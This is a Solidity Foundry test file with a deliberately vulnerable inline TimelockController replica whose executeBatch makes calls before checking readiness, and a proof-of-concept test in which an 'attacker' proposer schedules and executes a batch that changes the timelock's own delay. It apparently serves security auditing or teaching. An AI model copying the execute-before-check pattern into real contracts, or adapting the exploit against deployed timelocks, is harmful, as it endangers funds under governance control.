pragma solidity 0.8.20;

import "forge-std/Test.sol";

// Minimal vulnerable replica (inline — do NOT import from ../src/)
contract TimelockController {
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");
    bytes32 public constant EXECUTOR_ROLE = keccak256("EXECUTOR_ROLE");

    mapping(bytes32 => uint256) public _timestamps;
    uint256 private _minDelay;

    // simple role storage: role => account => allowed
    mapping(bytes32 => mapping(address => bool)) public roles;

    constructor(uint256 minDelay, address[] memory proposers, address[] memory executors) {
        _minDelay = minDelay;
        for (uint i = 0; i < proposers.length; ++i) {
            roles[PROPOSER_ROLE][proposers[i]] = true;
        }
        for (uint i = 0; i < executors.length; ++i) {
            roles[EXECUTOR_ROLE][executors[i]] = true;
        }
    }

    modifier onlyRole(bytes32 role) {
        require(roles[role][msg.sender], "onlyRole");
        _;
    }

    modifier onlyRoleOrOpenRole(bytes32 role) {
        if (!roles[role][address(0)]) {
            require(roles[role][msg.sender], "onlyRoleOrOpenRole");
        }
        _;
    }

    function getMinDelay() public view returns (uint256) {
        return _minDelay;
    }

    function hashOperationBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt
    ) public pure returns (bytes32) {
        return keccak256(abi.encode(targets, values, datas, predecessor, salt));
    }

    function scheduleBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) external onlyRole(PROPOSER_ROLE) {
        require(targets.length == values.length && targets.length == datas.length, "len");
        bytes32 id = hashOperationBatch(targets, values, datas, predecessor, salt);
        require(_timestamps[id] == 0, "exists");
        require(delay >= _minDelay, "insufficient delay");
        _timestamps[id] = block.timestamp + delay;
    }

    function executeBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt
    ) external payable onlyRoleOrOpenRole(EXECUTOR_ROLE) {
        require(targets.length == values.length && targets.length == datas.length, "len");
        bytes32 id = hashOperationBatch(targets, values, datas, predecessor, salt);
        _beforeCall(predecessor);
        for (uint i = 0; i < targets.length; ++i) {
            _call(id, i, targets[i], values[i], datas[i]);
        }
        _afterCall(id);
    }

    function _beforeCall(bytes32 predecessor) private view {
        require(predecessor == bytes32(0) || isOperationDone(predecessor), "missing dependency");
    }

    function _afterCall(bytes32 id) private {
        require(isOperationReady(id), "operation is not ready");
        _timestamps[id] = 1; // DONE
    }

    function _call(bytes32, uint256, address target, uint256 value, bytes calldata data) private {
        (bool success, ) = target.call{value: value}(data);
        require(success, "call failed");
    }

    function isOperationDone(bytes32 id) public view returns (bool) {
        return _timestamps[id] == 1;
    }

    function isOperationReady(bytes32 id) public view returns (bool) {
        uint256 ts = _timestamps[id];
        return ts > 1 && ts <= block.timestamp || ts == block.timestamp; // allow equality for delay=0
    }

    // Vulnerable privileged function that requires msg.sender == address(this)
    function updateDelay(uint256 newDelay) external {
        require(msg.sender == address(this), "caller must be timelock");
        _minDelay = newDelay;
    }
}

contract TimelockControllerTest is Test {
    TimelockController target;
    address attacker;

    function setUp() public {
        attacker = makeAddr("attacker");
        address[] memory proposers = new address[](1);
        proposers[0] = attacker;
        address[] memory executors = new address[](1);
        executors[0] = address(0); // open executor role
        target = new TimelockController(0, proposers, executors);
    }

    function test_attacker_exploits_executeBatch() public {
        // prepare batch: call updateDelay(uint256) on the timelock itself
        address[] memory targets = new address[](1);
        targets[0] = address(target);
        uint256[] memory values = new uint256[](1);
        values[0] = 0;
        bytes[] memory datas = new bytes[](1);
        datas[0] = abi.encodeWithSignature("updateDelay(uint256)", 999);

        // attacker (proposer) schedules the batch with zero delay
        vm.prank(attacker);
        target.scheduleBatch(targets, values, datas, bytes32(0), bytes32(0), 0);

        // because EXECUTOR_ROLE is open (address(0)), anyone can execute — attacker calls executeBatch
        vm.prank(attacker);
        target.executeBatch{value: 0}(targets, values, datas, bytes32(0), bytes32(0));

        // the call to updateDelay ran with msg.sender == address(this), so min delay changed
        assertEq(target.getMinDelay(), 999);
    }
}

